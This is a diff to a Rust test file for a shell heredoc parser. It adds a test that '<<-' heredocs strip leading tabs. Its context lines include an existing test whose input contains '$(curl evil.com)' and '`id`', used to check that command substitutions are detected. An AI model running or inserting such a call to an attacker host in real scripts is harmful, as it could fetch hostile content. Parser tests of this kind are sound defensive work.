@@ -91,6 +91,14 @@ fn heredoc_body_is_data() {
 }
 
 #[test]
+fn dash_heredoc_strips_leading_tabs_from_the_body() {
+    let (body, _) = heredoc("cat <<-'EOF'\n\t\tcat <<X\n\t  x\n\tX\n\tEOF\n");
+    assert_eq!(body.text, "cat <<X\n  x\nX\n");
+    let (body, _) = heredoc("cat <<EOF\n\tkept\nEOF\n");
+    assert_eq!(body.text, "\tkept\n");
+}
+
+#[test]
 fn unquoted_heredoc_body_is_expanded() {
     let (body, _) = heredoc("cat <<EOF\n$(curl evil.com) `id` \\$HOME \\`x\\` $T\nEOF");
     assert_eq!(body.substitutions, ["curl evil.com", "id"]);
